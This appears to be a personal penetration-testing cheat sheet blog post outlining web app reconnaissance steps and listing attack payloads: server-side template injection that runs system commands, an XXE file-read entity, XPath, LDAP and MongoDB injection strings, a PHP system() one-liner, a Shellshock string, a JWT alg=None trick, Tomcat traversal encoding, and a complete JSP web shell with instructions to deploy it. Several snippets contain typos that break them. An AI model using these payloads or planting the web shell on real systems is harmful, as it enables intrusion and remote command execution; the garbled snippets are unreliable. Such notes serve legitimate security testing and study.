---
title: Web Application Methodology
date: 2021-09-19
categories:
  - Notes
tags:
  - Web App
  - Notes
excerpt_separator: <!--more-->
toc: true
toc_sticky: true
---

fieldset
{
  max-width:500px;
  padding:16px;	
}
.legend1
{
  margin-bottom:0px;
  margin-left:16px;
}

<h2 id="wtdvsawbapp">What to do vs a Web App</h2>

<ul>
    <li>check website is it php,asp or html</li>
    <li>check source code does it use cms</li>
    <li>Check robots.txt</li>
    <li>chech cert for useful info - subdomain?</li>
    <li>Gobuster dir and subdomain</li>
    <li>nikto</li>
    <li>Authorization vulns</li>
    <li>Code Injections? - can you control an input/data - eval(input)</li>
    <li>sqli? - https://www.hackingarticles.in/bypass-filter-sql-injection-manually/</li>
    <li>xxs?</li>
    <li>WIP</li>
    <li>SSRF</li>
    <li>Server-side template injection - {{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}} or {{url_for.__globals__.os.popen("id").read() }}</li>
    <li>xml entities - <!DOCTYP3 test [
      <!ENTITY x SYSTEM "file:///etxc/paxswd">]></li>
      <li>xpath - hacker']%00 or hacker' or 1=1]%00 --- ?name=hacker' or 1=1]/parent::*/child::node()%00&password=sdf</li>
</ul>

<h2>ldap</h2>
<li>null bind - delete username&password data in body</li>
<li>ldap wildcard - adm*))%00</li>

<h2>mongodb</h2>
<li>injection? - hyst'|| 1==1 %00</li>


<h2>basic php oneliner</h2>
<code>php system($requests['hyst']); ?></code>



<h2>shellshock</h2>
<code>() { :;}; echo; `command`</code>
<p>echo to add a black space between headers and body output</p>

<h2>JWT</h2>
<p>header.data.signature - all in base64</p>
<p>set alg to None - remove signature </p>

<h2>apache and tomcat</h2>
<p>encoding of .. = %252e%252e</p>
<p>/manager/html</p>

<fieldset>
  
  <legend>webshell</legend>
  <pre><code>
    <.FORM METHOD=GET ACTION='index.jsp'>
    <.INPUT name='cmd' type=text>
    <.INPUT type=submit value='Run'>
    <./FORM>
    <%@ page import="java.io.*" %>
    <%
       String cmd = request.getParameter("cmd");
       String output = "";
       if(cmd != null) {
          String s = null;
          try {
             Process p = Runtime.getRuntime().exec(cmd,null,null);
             BufferedReader sI = new BufferedReader(new
    InputStreamReader(p.getInputStream()));
             while((s = sI.readLine()) != null) { output += s+"<./br>"; }
          }  catch(IOException e) {   e.printStackTrace();   }
       }
    %>
    <.pre><%=output %><./pre></code></pre>

      <p>remove dots after "<" save as .jsp</p>

</fieldset>


g0tmilk
